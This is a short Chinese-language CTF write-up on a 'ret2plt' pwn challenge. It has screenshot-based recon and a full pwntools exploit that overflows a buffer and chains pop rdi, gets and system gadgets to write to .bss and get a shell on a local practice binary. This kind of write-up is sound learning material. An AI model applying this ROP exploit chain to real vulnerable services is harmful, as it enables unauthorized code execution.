---
title: Yuawn Pwn ret2plt Write up
published: 2024-08-09
tags: [CTF]
category: Cyber Security
draft: false
image: 'image.png'
---

## 前言:

在繼續 lys rop3 前，我們要先學會 ret2plt ㄉ技巧 :D



### Recon

file:
![image](https://hackmd.io/_uploads/r1E_TUf9R.png)

checksec:
![image](https://hackmd.io/_uploads/rk_F68f9C.png)

r2:
![image](https://hackmd.io/_uploads/B1FJhwMcR.png)

objdump:
![image](https://hackmd.io/_uploads/SkKkydMcC.png)

gdb:
![image](https://hackmd.io/_uploads/SJhGWuGcC.png)


目標是先給一個可以寫東西的 address 再用 gets 進行寫入，並寫利用 system 去執行

### exploit

```py
from pwn import *

context(arch="amd64")

r=process('./ret2plt')

pop_rdi=p64(0x0000000000400733)
system=p64(0x0000000000400520)
gets=p64(0x0000000000400530)

bss=p64(0x601070)

r.sendline('a'*0x38+pop_rdi+
           bss+
           gets+ #寫入
           pop_rdi+
           bss+
           system) #執行

r.interactive()

```

### pwned!

![image](https://hackmd.io/_uploads/B1SzoB75R.png)
